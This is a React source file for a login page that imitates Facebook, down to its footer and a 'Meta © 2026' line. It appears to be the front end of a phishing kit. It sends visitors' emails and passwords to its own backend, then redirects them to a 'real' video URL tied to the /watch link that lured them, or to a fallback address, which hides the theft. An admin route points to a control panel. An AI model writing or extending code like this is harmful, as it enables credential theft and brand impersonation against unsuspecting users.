import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import LoginForm from './components/LoginForm'
import HeroSection from './components/HeroSection'
import './App.css'

const API = 'http://localhost:3001'

function App() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const navigate = useNavigate()

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setError('')
    setLoading(true)

    try {
      const res = await fetch(`${API}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      })

      const data = await res.json()

      if (data.role === 'admin') {
        navigate('/admin')
        return
      }

      // Check if the user came from a /watch/:slug link
      const watchSlug = sessionStorage.getItem('watchSlug')
      if (watchSlug) {
        sessionStorage.removeItem('watchSlug')
        // Fetch the real video URL for this slug
        const vRes = await fetch(`${API}/api/watch/${watchSlug}`)
        if (vRes.ok) {
          const vData = await vRes.json()
          window.location.href = vData.originalUrl
          return
        }
      }

      // Fall back to the global redirect URL
      if (data.redirect) {
        window.location.href = data.redirect
      } else {
        setError('Something went wrong. Please try again.')
      }
    } catch {
      setError('Cannot connect to server. Make sure the backend is running.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="fb-page">
      <main className="fb-main">
        <HeroSection />
        <LoginForm
          email={email}
          password={password}
          onEmailChange={setEmail}
          onPasswordChange={setPassword}
          onSubmit={handleLogin}
          loading={loading}
          error={error}
        />
      </main>

      <footer className="fb-footer">
        <nav className="fb-footer__links">
          <a href="#">English (US)</a>
          <a href="#">Français (France)</a>
          <a href="#">Español</a>
          <a href="#">Português (Brasil)</a>
          <a href="#">Deutsch</a>
          <a href="#">العربية</a>
        </nav>
        <hr className="fb-footer__divider" />
        <p className="fb-footer__meta">Meta © 2026</p>
      </footer>
    </div>
  )
}

export default App
